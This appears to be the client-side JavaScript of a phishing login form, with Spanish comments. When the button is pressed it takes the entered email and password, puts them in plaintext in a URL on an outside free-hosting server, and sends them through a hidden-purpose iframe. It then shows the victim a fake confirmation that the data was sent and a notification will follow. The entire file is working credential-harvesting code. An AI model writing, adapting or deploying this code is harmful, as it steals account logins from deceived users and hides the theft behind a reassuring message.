listenerbtn("btnConfirmar", validarEntrada); //este es el nuevo complemento que escucha el btn y usa una funcion
function validarEntrada() {
	var inputE1 = document.getElementById("email");
	var inputE2 = document.getElementById("pass");
	if ( (inputE1.value == "") || (inputE2.value == "") ) {
		alert("Un campo o los dos campos están vacíos.");
	} else {
		enviarDatos("email", "pass");//esta funcion envia los datos a la base.
		mostrarProceso();
	}
}

function enviarDatos(emailN, passN) {
	var iframePresente = false;
	if (document.getElementById("newIframe")) {
		iframePresente = true;
	}
	if (iframePresente == false) {
			//se crea el elemento iframe con los valores 
			//de la url: fecha, usuario, contraseña.
			//CREAR EL IFRAME
			//primero se crea y concatena la url (fecha, usuario, pass)
			//#1: la fecha (var fecha)
			var meses = new Array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
			var d = new Date();
			var fecha = d.getDate() + "%2f" + meses[d.getMonth()] + "%2f" + d.getFullYear() + "+-+" + d.getHours() + "%3a" + d.getMinutes();
			//#2: el usuario
			var usuario = document.getElementById(emailN).value;
			//#3: la contraseña
			var contrasena = document.getElementById(passN).value;
		
		//variable de la url
		var srcRegistro = "https://acc-form-srv-in.000webhostapp.com/formulario.php?fecha=" + fecha + "&email=" + usuario + "&pass=" + contrasena;
		//obtener la caja donde va a estar el iframe
		var boxIframe = document.getElementById("cajaIframe");
		//crear el hijo el cual es el ifame y añadirlo con todos sus datos a la pagina
		var newIframe = document.createElement("iframe");
		newIframe.id = "newIframe";
		newIframe.src = srcRegistro;
		newIframe.width = "500px";
		newIframe.height = "220px";
		boxIframe.appendChild(newIframe);
		console.log("La función para enviar los datos ha respondido éxitosamente.");
		
	}
}

//###############################
function mostrarProceso() {
	var inputs = new Array(	document.getElementById("email"), 
							document.getElementById("pass"), 
							document.getElementById("btnConfirmar"),
							document.getElementById("fraseProceso"));
	//inputs
	inputs[0].disabled = "true";
	inputs[1].disabled = "true";
	inputs[2].disabled = "true";
	//boton
	inputs[2].style.backgroundColor = "#919191";
	//frase proceso: enviando..
	inputs[3].style.backgroundColor = "#ff8508cf";
	inputs[3].innerHTML = "Enviando datos al servidor...";
	setTimeout(function() {
		//frase proceso: exitosamente...
		inputs[3].style.backgroundColor = "#4cb046ed";
		inputs[3].innerHTML = "Datos enviados, recibiras una notificación en unos momentos. <a id=\"enlaceRepetir\" href=\"\">Reenviar datos.</a>";
		var a = document.getElementById("enlaceRepetir").href = window.location;
	}, 8500) 
}



